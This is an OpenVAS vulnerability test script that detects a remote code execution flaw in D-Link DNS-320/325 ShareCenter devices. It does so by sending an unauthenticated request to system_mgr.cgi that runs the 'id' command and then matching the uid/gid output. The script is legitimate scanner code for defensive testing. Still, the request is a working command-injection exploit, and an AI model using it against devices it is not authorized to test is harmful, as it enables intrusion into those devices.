###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_sharecenter_51918.nasl 11 2013-10-27 10:12:02Z jan $
#
# D-Link ShareCenter Products Multiple Remote Code Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "D-Link ShareCenter products are prone to multiple remote code-
execution vulnerabilities.

Successful exploits will result in the execution of arbitrary code in
the context of the affected application. Failed exploit attempts may
result in a denial-of-service condition.

The following products are affected:

D-Link DNS-320 ShareCenter D-Link DNS-325 ShareCenter";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103699";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(51918);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("D-Link ShareCenter Products Multiple Remote Code Execution Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51918");
 script_xref(name:"URL", value:"http://sharecenter.dlink.com/");
 script_xref(name:"URL", value:"http://blog.emaze.net/2012/02/advisory-information-title.html");
 script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521532");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-04-18 12:07:07 +0200 (Thu, 18 Apr 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = '/web/login.html';

if(http_vuln_check(port:port, url:url, pattern:"login_mgr.cgi")) {

  url = '/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1=id';

  if(http_vuln_check(port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {

    security_hole(port:port);
    exit(0);

  }  

  exit(99);

}

exit(0);
